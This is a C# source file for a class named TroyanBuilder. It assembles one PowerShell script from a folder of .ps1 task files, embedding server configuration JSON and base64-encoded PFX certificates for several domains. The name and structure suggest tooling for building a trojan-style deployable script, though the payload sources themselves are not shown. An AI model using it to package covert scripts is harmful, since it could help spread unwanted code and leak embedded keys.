using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using model;

namespace TroyanBuilder;

public class TroyanBuilder
{
    private ServerModel _model = new ServerModel();
    private readonly StringBuilder _builder = new StringBuilder();
    private readonly List<string> _result = new List<string>();
    
    private readonly string[] _priorityItems = {"consts_cert", "consts_body", "utils" };
    private string[] _priorityLinks => _priorityItems.Select(x =>$". ./{x}.ps1").ToArray();
    
    private readonly string[] priorityTasks = {"dnsman", "cert" };
    private readonly string[] unpriorityTasks = {"extraupdate" };
    public List<string> Build(string server)
    {
        var x = new ServerService();
        var srv = x.GetServer(server, true);
        _model = srv.ServerModel!;
        MakeConsts();
        MakeCert();
        CompileSources();
        AddDo();
        File.WriteAllText(_model.Troyan,_builder.ToString());
        return _result;
    }

    public void CompileSources()
    {
        var sourceFiles = GetSourceFiles();
        foreach (var sourceFile in sourceFiles)
        {
            var data = ReadSource(sourceFile);
            _builder.Append(data);
            _builder.AppendLine();
        }
    }

    public void AddDo()
    {
        var sourceFiles = GetSourceFiles()
            .Except(_priorityItems)
            .SortWithPriority(priorityTasks, unpriorityTasks).ToArray();
        foreach (var sourceFile in sourceFiles)
        {
            var doX = $"do_{sourceFile}";
            _builder.AppendLine(doX);
        }
    }

    public void MakeConsts()
    {
        var template = @"
$server = @'
_SERVER
'@ | ConvertFrom-Json
";

        var keywords = new List<string>
        {
            "Dir", "troyan", "dnSponsor", "ftp", "user", "alias",
            "login", "password", "ico", "domainController",
            "interfaces", "bux", "landing", "php", "domainIp"
        };

        var serverFilePath = _model.UserServerFile;
        var serverJson = File.ReadAllText(serverFilePath);
        var server = JsonNode.Parse(serverJson)!;

        JsonNode FilterObjectByKeywords(JsonNode serverObject, List<string> filterKeywords)
        {
            var filteredDictionary = serverObject.AsObject()
                .Where(kvp => !filterKeywords.Contains(kvp.Key, StringComparer.OrdinalIgnoreCase))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            return JsonNode.Parse(JsonSerializer.Serialize(filteredDictionary))!;
        }

        var filteredObject = FilterObjectByKeywords(server, keywords);
        var serverJsonString = JsonSerializer.Serialize(filteredObject, new JsonSerializerOptions { WriteIndented = true });
        template = template.Replace("_SERVER", serverJsonString);

        var outputPath = Path.Combine(_model.TroyanScriptDir, "consts_body.ps1");
        File.WriteAllText(outputPath, template);
    }

    public string PfxFile(string domain)
    {
        return Path.Combine(_model.CertDir, domain + ".pfx");
    }

    public string MakeCert()
    {
        var template = @"

        `$xdata = @{
        _CERT
    }
        
";

        var stringList = new List<string>();

        foreach (var domainIp in _model.DomainIps)
        {
            foreach (var domain in domainIp.Domains)
            {
                var pathPfx = PfxFile(domain);
                if (string.IsNullOrEmpty(pathPfx))
                {
                    throw new Exception($"The certificate is not found for domain: {domain}");
                }

                var binaryData = File.ReadAllBytes(pathPfx);
                var base64 = Convert.ToBase64String(binaryData);
                var chunkSize = 200;
                var chunks = new List<string>();

                for (var i = 0; i < base64.Length; i += chunkSize)
                {
                    var chunk = base64.Substring(i, Math.Min(chunkSize, base64.Length - i));
                    chunks.Add(chunk);
                }

                var code = "'" + string.Join("'+" + Environment.NewLine + "'", chunks) + "'";
                stringList.Add($"'{domain}'={code}");
            }
        }

        var listString = string.Join(Environment.NewLine, stringList);
        template = template.Replace("_CERT", listString);

        var outputPath = Path.Combine(_model.TroyanScriptDir, "consts_cert.ps1");
        File.WriteAllText(outputPath, template);

        return template;
    }

    private string[] GetSourceFiles()
    {
        var files = Directory.GetFiles(_model.TroyanScriptDir)
            .Select(Path.GetFileNameWithoutExtension).ToArray();
    
        var sortedArray = files.SortWithPriority(_priorityItems);
        return sortedArray;
    }

    private string ReadSource(string sourceFile)
    {
        var lines = File.ReadAllLines(Path.Combine(_model.TroyanScriptDir, sourceFile + ".ps1"));
        var filteredLines = lines.Exclude(_priorityLinks);
        
        var result = string.Join(Environment.NewLine, filteredLines);

        return result;
    }
}